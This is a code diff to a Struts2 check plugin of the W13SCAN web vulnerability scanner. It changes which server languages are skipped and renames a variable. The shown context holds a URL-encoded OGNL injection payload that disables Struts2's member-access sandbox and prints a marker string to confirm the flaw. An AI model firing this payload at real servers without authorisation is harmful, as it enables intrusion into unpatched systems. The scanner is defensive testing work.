@@ -33,8 +33,8 @@ class W13SCAN(PluginBase):
         params = self.requests.params
         netloc = self.requests.netloc
 
-        # if not self.response.language or self.response.language != "ASP":
-        #     return
+        if self.response.language is None or self.response.language == "JAVA":
+            return
         if method == 'GET':
             exi = os.path.splitext(p.path)[1]
             if exi not in acceptedExt:
@@ -56,9 +56,9 @@ class W13SCAN(PluginBase):
                 r'%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28%27%3cStruts2-vuln-%27%29%29.%28%23w.print%28%27Check%3e%27%29%29.%28%23w.close%28%29%29%7D/'
             ]
             url1 = get_parent_paths(netloc)[0]
-            file = url.split('/')[-1]
+            _suffix = url.split('/')[-1]
             for payload in payloads:
-                r = requests.get(url1 + payload + file, headers=headers,allow_redirects=False)
+                r = requests.get(url1 + payload + _suffix, headers=headers,allow_redirects=False)
                 for check in checks:
                     if check in str(r.headers) or check in r.text:
                         out.success(url, self.name, playload="{}".format(payload), method="GET", check=check,
